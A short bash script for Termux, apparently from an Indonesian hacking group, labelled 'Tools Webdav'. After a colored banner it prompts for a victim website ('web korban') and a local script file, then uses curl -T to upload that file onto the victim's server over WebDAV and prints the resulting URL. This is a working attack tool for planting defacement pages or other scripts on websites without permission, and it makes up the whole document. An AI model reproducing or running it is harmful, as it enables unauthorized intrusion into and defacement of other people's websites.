 #!/bin/bash


# Please Don't recode =(
# Hae Mastah '-' mau ngapain? 
# Author : Star'-'


purple='\033[35;1m'
cyan='\033[36;1m'
white='\033[37;1m'
yellow='\033[33;1m'
red='\033[1;91m'
blue='\033[34;1m'
green='\033[32;1m'


termux-setup-storage
clear
clear
echo '\033[1;91m ┌──────────────────┐'
echo '\033[33;1m│▌ ▌▛▀▘▛▀▖▛▀▖ ▞▀▖▌ ▌│'
echo '\033[34;1m│▌▖▌▙▄ ▙▄▘▌ ▌ ▙▄▌▚▗▘│'
echo '\033[32;1m│▙▚▌▌  ▌ ▌ ▌ ▌ ▌ ▌ ▝▞ │'
echo '\033[35;1m│▘ ▘▀▀▘▀▀ ▀▀  ▘ ▘   ▘ │'
echo '\033[36;1m└──────────────────'
echo '\033[34;1mTools Webdav Version 1.1'
echo '\033[32;1mAuthor By Star:v'
echo '\033[38;1mFrom : SAD Cyber Team'
sleep 2 
echo ""
read -p "Masukkan web korban  ~# " target;
read -p "Nama script lu coeg  ~# "  sc;
curl -a -T /storage/emulated/0/$sc $target
echo "$yellow Hasilnya :v |==>"  $target/$sc;


